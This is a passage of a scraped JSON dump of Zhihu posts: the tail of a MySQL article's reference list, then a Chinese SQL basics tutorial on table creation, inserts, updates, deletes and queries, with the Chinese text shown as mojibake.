data-rawheight=\"390\" class=\"origin_image zh-lightbox-thumb\" width=\"632\" data-original=\"https://pic3.zhimg.com/v2-077ac71910b1c1e212ab8b92df465c6e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;632&#39; height=&#39;390&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"632\" data-rawheight=\"390\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"632\" data-original=\"https://pic3.zhimg.com/v2-077ac71910b1c1e212ab8b92df465c6e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-077ac71910b1c1e212ab8b92df465c6e_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å‚è€ƒèµ„æ–™</h2><ul><li>BaronScbwartz, PeterZaitsev, VadimTkacbenko, ç­‰. é«˜æ€§èƒ½ MySQL[M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2013.</li><li>å§œæ‰¿å°§. MySQL æŠ€æœ¯å†…å¹•: InnoDB å­˜å‚¨å¼•æ“ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2011.</li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.jfox.info/20-tiao-mysql-xing-nen-you-hua-de-zui-jia-jing-yan.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">20+ æ¡ MySQL æ€§èƒ½ä¼˜åŒ–çš„æœ€ä½³ç»éªŒ</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//blog.720ui.com/2017/mysql_core_09_multi_db_table2/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æœåŠ¡ç«¯æŒ‡å— æ•°æ®å­˜å‚¨ç¯‡ | MySQLï¼ˆ09ï¼‰ åˆ†åº“ä¸åˆ†è¡¨å¸¦æ¥çš„åˆ†å¸ƒå¼å›°å¢ƒä¸åº”å¯¹ä¹‹ç­–</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/788829/how-to-create-unique-row-id-in-sharded-databases\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">How to create unique row ID in sharded databases?</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//geekswithblogs.net/shaunxu/archive/2012/01/07/sql-azure-federation-ndash-introduction.aspx\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">SQL Azure Federation â€“ Introduction</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//blog.codinglabs.org/articles/theory-of-mysql-index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">MySQL ç´¢å¼•èƒŒåçš„æ•°æ®ç»“æ„åŠç®—æ³•åŸç†</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000008131735\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">MySQL æ€§èƒ½ä¼˜åŒ–ç¥å™¨ Explain ä½¿ç”¨åˆ†æ</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//medium.com/%40jeeyoungk/how-sharding-works-b4dec46b3f6\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">How Sharding Works</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//tech.meituan.com/dianping_order_db_sharding.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">å¤§ä¼—ç‚¹è¯„è®¢å•ç³»ç»Ÿåˆ†åº“åˆ†è¡¨å®è·µ</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/B%252B%25E6%25A0%2591\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">B + æ ‘</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;899&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "æ•°æ®åº“", 
                    "tagLink": "https://api.zhihu.com/topics/19552067"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68500444", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "SQL", 
            "content": "<p></p><h2>ä¸€ã€åŸºç¡€</h2><p>æ¨¡å¼å®šä¹‰äº†æ•°æ®å¦‚ä½•å­˜å‚¨ã€å­˜å‚¨ä»€ä¹ˆæ ·çš„æ•°æ®ä»¥åŠæ•°æ®å¦‚ä½•åˆ†è§£ç­‰ä¿¡æ¯ï¼Œæ•°æ®åº“å’Œè¡¨éƒ½æœ‰æ¨¡å¼ã€‚</p><p>ä¸»é”®çš„å€¼ä¸å…è®¸ä¿®æ”¹ï¼Œä¹Ÿä¸å…è®¸å¤ç”¨ï¼ˆä¸èƒ½å°†å·²ç»åˆ é™¤çš„ä¸»é”®å€¼èµ‹ç»™æ–°æ•°æ®è¡Œçš„ä¸»é”®ï¼‰ã€‚</p><p>SQLï¼ˆStructured Query Language)ï¼Œæ ‡å‡† SQL ç”± ANSI æ ‡å‡†å§”å‘˜ä¼šç®¡ç†ï¼Œä»è€Œç§°ä¸º ANSI SQLã€‚å„ä¸ª DBMS éƒ½æœ‰è‡ªå·±çš„å®ç°ï¼Œå¦‚ PL/SQLã€Transact-SQL ç­‰ã€‚</p><p>SQL è¯­å¥ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†æ˜¯æ•°æ®åº“è¡¨åã€åˆ—åå’Œå€¼æ˜¯å¦åŒºåˆ†ä¾èµ–äºå…·ä½“çš„ DBMS ä»¥åŠé…ç½®ã€‚</p><p>SQL æ”¯æŒä»¥ä¸‹ä¸‰ç§æ³¨é‡Šï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"o\">#</span> <span class=\"err\">æ³¨é‡Š</span>\n<span class=\"k\">SELECT</span> <span class=\"o\">*</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span><span class=\"p\">;</span> <span class=\"c1\">-- æ³¨é‡Š\n</span><span class=\"c1\"></span><span class=\"cm\">/* æ³¨é‡Š1\n</span><span class=\"cm\">   æ³¨é‡Š2 */</span></code></pre></div><p>æ•°æ®åº“åˆ›å»ºä¸ä½¿ç”¨ï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">CREATE</span> <span class=\"k\">DATABASE</span> <span class=\"n\">test</span><span class=\"p\">;</span>\n<span class=\"n\">USE</span> <span class=\"n\">test</span><span class=\"p\">;</span></code></pre></div><h2>äºŒã€åˆ›å»ºè¡¨</h2><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">mytable</span> <span class=\"p\">(</span>\n  <span class=\"o\">#</span> <span class=\"nb\">int</span> <span class=\"err\">ç±»å‹ï¼Œä¸ä¸ºç©ºï¼Œè‡ªå¢</span>\n  <span class=\"n\">id</span> <span class=\"nb\">INT</span> <span class=\"k\">NOT</span> <span class=\"k\">NULL</span> <span class=\"n\">AUTO_INCREMENT</span><span class=\"p\">,</span>\n  <span class=\"o\">#</span> <span class=\"nb\">int</span> <span class=\"err\">ç±»å‹ï¼Œä¸å¯ä¸ºç©ºï¼Œé»˜è®¤å€¼ä¸º</span> <span class=\"mi\">1</span><span class=\"err\">ï¼Œä¸ä¸ºç©º</span>\n  <span class=\"n\">col1</span> <span class=\"nb\">INT</span> <span class=\"k\">NOT</span> <span class=\"k\">NULL</span> <span class=\"k\">DEFAULT</span> <span class=\"mi\">1</span><span class=\"p\">,</span>\n  <span class=\"o\">#</span> <span class=\"err\">å˜é•¿å­—ç¬¦ä¸²ç±»å‹ï¼Œæœ€é•¿ä¸º</span> <span class=\"mi\">45</span> <span class=\"err\">ä¸ªå­—ç¬¦ï¼Œå¯ä»¥ä¸ºç©º</span>\n  <span class=\"n\">col2</span> <span class=\"nb\">VARCHAR</span><span class=\"p\">(</span><span class=\"mi\">45</span><span class=\"p\">)</span> <span class=\"k\">NULL</span><span class=\"p\">,</span>\n  <span class=\"o\">#</span> <span class=\"err\">æ—¥æœŸç±»å‹ï¼Œå¯ä¸ºç©º</span>\n  <span class=\"n\">col3</span> <span class=\"nb\">DATE</span> <span class=\"k\">NULL</span><span class=\"p\">,</span>\n  <span class=\"o\">#</span> <span class=\"err\">è®¾ç½®ä¸»é”®ä¸º</span> <span class=\"n\">id</span>\n  <span class=\"k\">PRIMARY</span> <span class=\"k\">KEY</span> <span class=\"p\">(</span><span class=\"o\">`</span><span class=\"n\">id</span><span class=\"o\">`</span><span class=\"p\">));</span></code></pre></div><h2>ä¸‰ã€ä¿®æ”¹è¡¨</h2><p>æ·»åŠ åˆ—</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">ALTER</span> <span class=\"k\">TABLE</span> <span class=\"n\">mytable</span>\n<span class=\"k\">ADD</span> <span class=\"n\">col</span> <span class=\"nb\">CHAR</span><span class=\"p\">(</span><span class=\"mi\">20</span><span class=\"p\">);</span></code></pre></div><p>åˆ é™¤åˆ—</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">ALTER</span> <span class=\"k\">TABLE</span> <span class=\"n\">mytable</span>\n<span class=\"k\">DROP</span> <span class=\"k\">COLUMN</span> <span class=\"n\">col</span><span class=\"p\">;</span></code></pre></div><p>åˆ é™¤è¡¨</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">DROP</span> <span class=\"k\">TABLE</span> <span class=\"n\">mytable</span><span class=\"p\">;</span></code></pre></div><h2>å››ã€æ’å…¥</h2><p>æ™®é€šæ’å…¥</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">INSERT</span> <span class=\"k\">INTO</span> <span class=\"n\">mytable</span><span class=\"p\">(</span><span class=\"n\">col1</span><span class=\"p\">,</span> <span class=\"n\">col2</span><span class=\"p\">)</span>\n<span class=\"k\">VALUES</span><span class=\"p\">(</span><span class=\"n\">val1</span><span class=\"p\">,</span> <span class=\"n\">val2</span><span class=\"p\">);</span></code></pre></div><p>æ’å…¥æ£€ç´¢å‡ºæ¥çš„æ•°æ®</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">INSERT</span> <span class=\"k\">INTO</span> <span class=\"n\">mytable1</span><span class=\"p\">(</span><span class=\"n\">col1</span><span class=\"p\">,</span> <span class=\"n\">col2</span><span class=\"p\">)</span>\n<span class=\"k\">SELECT</span> <span class=\"n\">col1</span><span class=\"p\">,</span> <span class=\"n\">col2</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable2</span><span class=\"p\">;</span></code></pre></div><p>å°†ä¸€ä¸ªè¡¨çš„å†…å®¹æ’å…¥åˆ°ä¸€ä¸ªæ–°è¡¨</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">newtable</span> <span class=\"k\">AS</span>\n<span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">mytable</span><span class=\"p\">;</span></code></pre></div><h2>äº”ã€æ›´æ–°</h2><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">UPDATE</span> <span class=\"n\">mytable</span>\n<span class=\"k\">SET</span> <span class=\"n\">col</span> <span class=\"o\">=</span> <span class=\"n\">val</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">id</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span></code></pre></div><h2>å…­ã€åˆ é™¤</h2><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">DELETE</span> <span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">id</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span></code></pre></div><p><b>TRUNCATE TABLE</b>  å¯ä»¥æ¸…ç©ºè¡¨ï¼Œä¹Ÿå°±æ˜¯åˆ é™¤æ‰€æœ‰è¡Œã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">TRUNCATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">mytable</span><span class=\"p\">;</span></code></pre></div><p>ä½¿ç”¨æ›´æ–°å’Œåˆ é™¤æ“ä½œæ—¶ä¸€å®šè¦ç”¨ WHERE å­å¥ï¼Œä¸ç„¶ä¼šæŠŠæ•´å¼ è¡¨çš„æ•°æ®éƒ½ç ´åã€‚å¯ä»¥å…ˆç”¨ SELECT è¯­å¥è¿›è¡Œæµ‹è¯•ï¼Œé˜²æ­¢é”™è¯¯åˆ é™¤ã€‚</p><h2>ä¸ƒã€æŸ¥è¯¢</h2><h2>DISTINCT</h2><p>ç›¸åŒå€¼åªä¼šå‡ºç°ä¸€æ¬¡ã€‚å®ƒä½œç”¨äºæ‰€æœ‰åˆ—ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰åˆ—çš„å€¼éƒ½ç›¸åŒæ‰ç®—ç›¸åŒã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"k\">DISTINCT</span> <span class=\"n\">col1</span><span class=\"p\">,</span> <span class=\"n\">col2</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span><span class=\"p\">;</span></code></pre></div><h2>LIMIT</h2><p>é™åˆ¶è¿”å›çš„è¡Œæ•°ã€‚å¯ä»¥æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºèµ·å§‹è¡Œï¼Œä» 0 å¼€å§‹ï¼›ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¿”å›çš„æ€»è¡Œæ•°ã€‚</p><p>è¿”å›å‰ 5 è¡Œï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"o\">*</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">LIMIT</span> <span class=\"mi\">5</span><span class=\"p\">;</span>\n<span class=\"k\">SELECT</span> <span class=\"o\">*</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">LIMIT</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">5</span><span class=\"p\">;</span></code></pre></div><p>è¿”å›ç¬¬ 3 \\~ 5 è¡Œï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"o\">*</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">LIMIT</span> <span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">3</span><span class=\"p\">;</span></code></pre></div><h2>å…«ã€æ’åº</h2><ul><li><b>ASC</b> ï¼šå‡åºï¼ˆé»˜è®¤ï¼‰</li><li><b>DESC</b> ï¼šé™åº</li></ul><p>å¯ä»¥æŒ‰å¤šä¸ªåˆ—è¿›è¡Œæ’åºï¼Œå¹¶ä¸”ä¸ºæ¯ä¸ªåˆ—æŒ‡å®šä¸åŒçš„æ’åºæ–¹å¼ï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"o\">*</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">ORDER</span> <span class=\"k\">BY</span> <span class=\"n\">col1</span> <span class=\"k\">DESC</span><span class=\"p\">,</span> <span class=\"n\">col2</span> <span class=\"k\">ASC</span><span class=\"p\">;</span></code></pre></div><h2>ä¹ã€è¿‡æ»¤</h2><p>ä¸è¿›è¡Œè¿‡æ»¤çš„æ•°æ®éå¸¸å¤§ï¼Œå¯¼è‡´é€šè¿‡ç½‘ç»œä¼ è¾“äº†å¤šä½™çš„æ•°æ®ï¼Œä»è€Œæµªè´¹äº†ç½‘ç»œå¸¦å®½ã€‚å› æ­¤å°½é‡ä½¿ç”¨ SQL è¯­å¥æ¥è¿‡æ»¤ä¸å¿…è¦çš„æ•°æ®ï¼Œè€Œä¸æ˜¯ä¼ è¾“æ‰€æœ‰çš„æ•°æ®åˆ°å®¢æˆ·ç«¯ä¸­ç„¶åç”±å®¢æˆ·ç«¯è¿›è¡Œè¿‡æ»¤ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"o\">*</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">col</span> <span class=\"k\">IS</span> <span class=\"k\">NULL</span><span class=\"p\">;</span></code></pre></div><p>ä¸‹è¡¨æ˜¾ç¤ºäº† WHERE å­å¥å¯ç”¨çš„æ“ä½œç¬¦</p><p>|  æ“ä½œç¬¦ | è¯´æ˜  | | :---: | :---: | | = | ç­‰äº | | &lt; | å°äº | | &gt; | å¤§äº | | &lt;&gt; != | ä¸ç­‰äº | | &lt;= !&gt; | å°äºç­‰äº | | &gt;= !&lt; | å¤§äºç­‰äº | | BETWEEN | åœ¨ä¸¤ä¸ªå€¼ä¹‹é—´ | | IS NULL | ä¸º NULL å€¼ |</p><p>åº”è¯¥æ³¨æ„åˆ°ï¼ŒNULL ä¸ 0ã€ç©ºå­—ç¬¦ä¸²éƒ½ä¸åŒã€‚</p><p><b>AND å’Œ OR</b>  ç”¨äºè¿æ¥å¤šä¸ªè¿‡æ»¤æ¡ä»¶ã€‚ä¼˜å…ˆå¤„ç† ANDï¼Œå½“ä¸€ä¸ªè¿‡æ»¤è¡¨è¾¾å¼æ¶‰åŠåˆ°å¤šä¸ª AND å’Œ OR æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ () æ¥å†³å®šä¼˜å…ˆçº§ï¼Œä½¿å¾—ä¼˜å…ˆçº§å…³ç³»æ›´æ¸…æ™°ã€‚</p><p><b>IN</b>  æ“ä½œç¬¦ç”¨äºåŒ¹é…ä¸€ç»„å€¼ï¼Œå…¶åä¹Ÿå¯ä»¥æ¥ä¸€ä¸ª SELECT å­å¥ï¼Œä»è€ŒåŒ¹é…å­æŸ¥è¯¢å¾—åˆ°çš„ä¸€ç»„å€¼ã€‚</p><p><b>NOT</b>  æ“ä½œç¬¦ç”¨äºå¦å®šä¸€ä¸ªæ¡ä»¶ã€‚</p><h2>åã€é€šé…ç¬¦</h2><p>é€šé…ç¬¦ä¹Ÿæ˜¯ç”¨åœ¨è¿‡æ»¤è¯­å¥ä¸­ï¼Œä½†å®ƒåªèƒ½ç”¨äºæ–‡æœ¬å­—æ®µã€‚</p><ul><li><b>%</b>  åŒ¹é… &gt;=0 ä¸ªä»»æ„å­—ç¬¦ï¼›<br/> </li><li><b>_</b>  åŒ¹é… ==1 ä¸ªä»»æ„å­—ç¬¦ï¼›<br/> </li><li><b>[ ]</b>  å¯ä»¥åŒ¹é…é›†åˆå†…çš„å­—ç¬¦ï¼Œä¾‹å¦‚ [ab] å°†åŒ¹é…å­—ç¬¦ a æˆ–è€… bã€‚ç”¨è„±å­—ç¬¦ ^ å¯ä»¥å¯¹å…¶è¿›è¡Œå¦å®šï¼Œä¹Ÿå°±æ˜¯ä¸åŒ¹é…é›†åˆå†…çš„å­—ç¬¦ã€‚<br/> </li></ul><p>ä½¿ç”¨ Like æ¥è¿›è¡Œé€šé…ç¬¦åŒ¹é…ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"o\">*</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">col</span> <span class=\"k\">LIKE</span> <span class=\"s1\">&#39;[^AB]%&#39;</span><span class=\"p\">;</span> <span class=\"c1\">-- ä¸ä»¥ A å’Œ B å¼€å¤´çš„ä»»æ„æ–‡æœ¬</span></code></pre></div><p>ä¸è¦æ»¥ç”¨é€šé…ç¬¦ï¼Œé€šé…ç¬¦ä½äºå¼€å¤´å¤„åŒ¹é…ä¼šéå¸¸æ…¢ã€‚</p><h2>åä¸€ã€è®¡ç®—å­—æ®µ</h2><p>åœ¨æ•°æ®åº“æœåŠ¡å™¨ä¸Šå®Œæˆæ•°æ®çš„è½¬æ¢å’Œæ ¼å¼åŒ–çš„å·¥ä½œå¾€å¾€æ¯”å®¢æˆ·ç«¯ä¸Šå¿«å¾—å¤šï¼Œå¹¶ä¸”è½¬æ¢å’Œæ ¼å¼åŒ–åçš„æ•°æ®é‡æ›´å°‘çš„è¯å¯ä»¥å‡å°‘ç½‘ç»œé€šä¿¡é‡ã€‚</p><p>è®¡ç®—å­—æ®µé€šå¸¸éœ€è¦ä½¿ç”¨  <b>AS</b>  æ¥å–åˆ«åï¼Œå¦åˆ™è¾“å‡ºçš„æ—¶å€™å­—æ®µåä¸ºè®¡ç®—è¡¨è¾¾å¼ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">col1</span> <span class=\"o\">*</span> <span class=\"n\">col2</span> <span class=\"k\">AS</span> <span class=\"k\">alias</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span><span class=\"p\">;</span></code></pre></div><p><b>CONCAT()</b>  ç”¨äºè¿æ¥ä¸¤ä¸ªå­—æ®µã€‚è®¸å¤šæ•°æ®åº“ä¼šä½¿ç”¨ç©ºæ ¼æŠŠä¸€ä¸ªå€¼å¡«å……ä¸ºåˆ—å®½ï¼Œå› æ­¤è¿æ¥çš„ç»“æœä¼šå‡ºç°ä¸€äº›ä¸å¿…è¦çš„ç©ºæ ¼ï¼Œä½¿ç”¨ <b>TRIM()</b> å¯ä»¥å»é™¤é¦–å°¾ç©ºæ ¼ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">CONCAT</span><span class=\"p\">(</span><span class=\"k\">TRIM</span><span class=\"p\">(</span><span class=\"n\">col1</span><span class=\"p\">),</span> <span class=\"s1\">&#39;(&#39;</span><span class=\"p\">,</span> <span class=\"k\">TRIM</span><span class=\"p\">(</span><span class=\"n\">col2</span><span class=\"p\">),</span> <span class=\"s1\">&#39;)&#39;</span><span class=\"p\">)</span> <span class=\"k\">AS</span> <span class=\"n\">concat_col</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span><span class=\"p\">;</span></code></pre></div><h2>åäºŒã€å‡½æ•°</h2><p>å„ä¸ª DBMS çš„å‡½æ•°éƒ½æ˜¯ä¸ç›¸åŒçš„ï¼Œå› æ­¤ä¸å¯ç§»æ¤ï¼Œä»¥ä¸‹ä¸»è¦æ˜¯ MySQL çš„å‡½æ•°ã€‚</p><h2>æ±‡æ€»</h2><p>|å‡½ æ•° |è¯´ æ˜| | :---: | :---: | | AVG() | è¿”å›æŸåˆ—çš„å¹³å‡å€¼ | | COUNT() | è¿”å›æŸåˆ—çš„è¡Œæ•° | | MAX() | è¿”å›æŸåˆ—çš„æœ€å¤§å€¼ | | MIN() | è¿”å›æŸåˆ—çš„æœ€å°å€¼ | | SUM() |è¿”å›æŸåˆ—å€¼ä¹‹å’Œ |</p><p>AVG() ä¼šå¿½ç•¥ NULL è¡Œã€‚</p><p>ä½¿ç”¨ DISTINCT å¯ä»¥æ±‡æ€»ä¸åŒçš„å€¼ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"k\">AVG</span><span class=\"p\">(</span><span class=\"k\">DISTINCT</span> <span class=\"n\">col1</span><span class=\"p\">)</span> <span class=\"k\">AS</span> <span class=\"n\">avg_col</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span><span class=\"p\">;</span></code></pre></div><h2>æ–‡æœ¬å¤„ç†</h2><p>| å‡½æ•°  | è¯´æ˜  | | :---: | :---: | |  LEFT() |  å·¦è¾¹çš„å­—ç¬¦ | | RIGHT() | å³è¾¹çš„å­—ç¬¦ | | LOWER() | è½¬æ¢ä¸ºå°å†™å­—ç¬¦ | | UPPER() | è½¬æ¢ä¸ºå¤§å†™å­—ç¬¦ | | LTRIM() | å»é™¤å·¦è¾¹çš„ç©ºæ ¼ | | RTRIM() | å»é™¤å³è¾¹çš„ç©ºæ ¼ | | LENGTH() | é•¿åº¦ | | SOUNDEX() | è½¬æ¢ä¸ºè¯­éŸ³å€¼ |</p><p>å…¶ä¸­ï¼Œ <b>SOUNDEX()</b>  å¯ä»¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸ºæè¿°å…¶è¯­éŸ³è¡¨ç¤ºçš„å­—æ¯æ•°å­—æ¨¡å¼ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"o\">*</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">SOUNDEX</span><span class=\"p\">(</span><span class=\"n\">col1</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">SOUNDEX</span><span class=\"p\">(</span><span class=\"s1\">&#39;apple&#39;</span><span class=\"p\">)</span></code></pre></div><h2>æ—¥æœŸå’Œæ—¶é—´å¤„ç†</h2><ul><li>æ—¥æœŸæ ¼å¼ï¼šYYYY-MM-DD</li><li>æ—¶é—´æ ¼å¼ï¼šHH:MM:SS</li></ul><p>|å‡½ æ•° | è¯´ æ˜| | :---: | :---: | | ADDDATE() | å¢åŠ ä¸€ä¸ªæ—¥æœŸï¼ˆå¤©ã€å‘¨ç­‰ï¼‰| | ADDTIME() | å¢åŠ ä¸€ä¸ªæ—¶é—´ï¼ˆæ—¶ã€åˆ†ç­‰ï¼‰| | CURDATE() | è¿”å›å½“å‰æ—¥æœŸ | | CURTIME() | è¿”å›å½“å‰æ—¶é—´ | | DATE() |è¿”å›æ—¥æœŸæ—¶é—´çš„æ—¥æœŸéƒ¨åˆ†| | DATEDIFF() |è®¡ç®—ä¸¤ä¸ªæ—¥æœŸä¹‹å·®| | DATE_ADD() |é«˜åº¦çµæ´»çš„æ—¥æœŸè¿ç®—å‡½æ•°| | DATE_FORMAT() |è¿”å›ä¸€ä¸ªæ ¼å¼åŒ–çš„æ—¥æœŸæˆ–æ—¶é—´ä¸²| | DAY()| è¿”å›ä¸€ä¸ªæ—¥æœŸçš„å¤©æ•°éƒ¨åˆ†| | DAYOFWEEK() |å¯¹äºä¸€ä¸ªæ—¥æœŸï¼Œè¿”å›å¯¹åº”çš„æ˜ŸæœŸå‡ | | HOUR() |è¿”å›ä¸€ä¸ªæ—¶é—´çš„å°æ—¶éƒ¨åˆ†| | MINUTE() |è¿”å›ä¸€ä¸ªæ—¶é—´çš„åˆ†é’Ÿéƒ¨åˆ†| | MONTH() |è¿”å›ä¸€ä¸ªæ—¥æœŸçš„æœˆä»½éƒ¨åˆ†| | NOW() |è¿”å›å½“å‰æ—¥æœŸå’Œæ—¶é—´| | SECOND() |è¿”å›ä¸€ä¸ªæ—¶é—´çš„ç§’éƒ¨åˆ†| | TIME() |è¿”å›ä¸€ä¸ªæ—¥æœŸæ—¶é—´çš„æ—¶é—´éƒ¨åˆ†| | YEAR() |è¿”å›ä¸€ä¸ªæ—¥æœŸçš„å¹´ä»½éƒ¨åˆ†|</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"n\">mysql</span><span class=\"o\">&gt;</span> <span class=\"k\">SELECT</span> <span class=\"n\">NOW</span><span class=\"p\">();</span>\n<span class=\"mi\">2018</span><span class=\"o\">-</span><span class=\"mi\">4</span><span class=\"o\">-</span><span class=\"mi\">14</span> <span class=\"mi\">20</span><span class=\"p\">:</span><span class=\"mi\">25</span><span class=\"p\">:</span><span class=\"mi\">11</span></code></pre></div><h2>æ•°å€¼å¤„ç†</h2><p>| å‡½æ•° | è¯´æ˜ | | :---: | :---: | | SIN() | æ­£å¼¦ | | COS() | ä½™å¼¦ | | TAN() | æ­£åˆ‡ | | ABS() | ç»å¯¹å€¼ | | SQRT() | å¹³æ–¹æ ¹ | | MOD() | ä½™æ•° | | EXP() | æŒ‡æ•° | | PI() | åœ†å‘¨ç‡ | | RAND() | éšæœºæ•° 